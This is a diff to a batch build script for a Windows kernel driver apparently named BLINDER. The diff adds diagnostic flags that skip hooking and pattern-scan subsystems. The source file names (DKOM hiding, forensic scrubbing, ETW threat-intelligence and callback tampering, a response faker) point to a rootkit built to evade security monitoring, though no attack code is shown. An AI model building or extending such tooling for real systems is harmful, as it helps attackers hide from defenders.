@@ -25,6 +25,21 @@ set LIBS="!WDK_LIB!\km\x64\ntoskrnl.lib" "!WDK_LIB!\km\x64\hal.lib" "!WDK_LIB!\k
 
 set CFLAGS=/nologo /c /O2 /W3 /kernel /GS- /Zc:wchar_t /D_WIN64 /D_AMD64_ /DAMD64 /D_X86_AMD64_ /DWIN32_LEAN_AND_MEAN /D_WINNT
 set CFLAGS=!CFLAGS! /D__INTRINSIC_GROUP_WIN_BASE=1
+rem Set BLINDER_DIAG=1 as an env var before running to produce a diag
+rem build (skips Resolve/Scrub/Etwti/VadFilter/ResponseFaker/Dkom; only
+rem installs NtHooks + ObCallback). Isolates which pattern-scan hangs.
+if "%BLINDER_DIAG%"=="1" (
+    set CFLAGS=!CFLAGS! /DBLINDER_DIAG=1
+    echo [+] DIAG mode: skipping pattern-scan subsystems
+)
+if "%BLINDER_SKIP_NT%"=="1" (
+    set CFLAGS=!CFLAGS! /DBLINDER_SKIP_NT=1
+    echo [+] SKIP_NT: skipping NtHooks_Install
+)
+if "%BLINDER_SKIP_OB%"=="1" (
+    set CFLAGS=!CFLAGS! /DBLINDER_SKIP_OB=1
+    echo [+] SKIP_OB: skipping ObCallback_Install
+)
 
 for %%f in (main.c forensic_scrub.c dkom_hide.c nt_hooks.c ob_callback.c etwti.c vad_filter.c response_faker.c utils.c) do (
     echo [cl] %%f
